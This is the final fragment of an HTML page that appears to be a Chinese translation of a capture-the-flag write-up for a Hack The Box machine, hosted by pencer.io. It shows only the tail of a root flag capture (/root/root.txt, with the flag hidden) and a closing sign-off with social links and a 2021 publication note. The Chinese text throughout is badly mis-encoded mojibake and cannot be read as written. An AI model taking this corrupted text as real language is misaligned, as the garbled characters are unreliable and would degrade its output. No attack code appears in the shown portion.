/root/root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="896d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é‚£æ˜¯ä¸€ä¸ªåˆé•¿åˆéš¾çš„ç›’å­ï¼Œä½†å¾ˆæœ‰è¶£ï¼Œæˆ‘å­¦åˆ°äº†ä¸€äº›éå¸¸å€¼å¾—çš„ä¸œè¥¿ã€‚æˆ‘å¸Œæœ›ä½ ä¹Ÿå–œæ¬¢ã€‚ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl od oe hu of" role="separator"><span class="og bw bk oh oi oj"/><span class="og bw bk oh oi oj"/><span class="og bw bk oh oi"/></div><div class="ij ik il im in"><p id="c457" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°ã€‚</p><p id="a596" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¨ç‰¹â€”ã€https://twitter.com/pencer_ioã€‘T4<br/>ç½‘ç«™â€” <a class="ae nl" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="539c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ok">åŸè½½äº2021å¹´12æœˆ19æ—¥</em><a class="ae nl" href="https://pencer.io/ctf/ctf-htb-static/" rel="noopener ugc nofollow" target="_blank"><em class="ok">https://pencer . io</em></a><em class="ok">ã€‚</em></p></div></div>    
</body>
</html>